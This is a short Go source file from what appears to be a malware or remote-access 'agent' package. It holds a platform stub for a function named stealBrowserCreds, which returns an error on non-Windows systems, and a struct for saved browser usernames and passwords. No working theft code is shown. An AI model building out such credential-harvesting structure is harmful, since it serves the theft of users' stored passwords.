//go:build !windows

package agent

import "fmt"

type BrowserCred struct {
	Source   string `json:"source"`
	Target   string `json:"target"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func stealBrowserCreds() ([]BrowserCred, error) {
	return nil, fmt.Errorf("browser creds not supported on this platform")
}
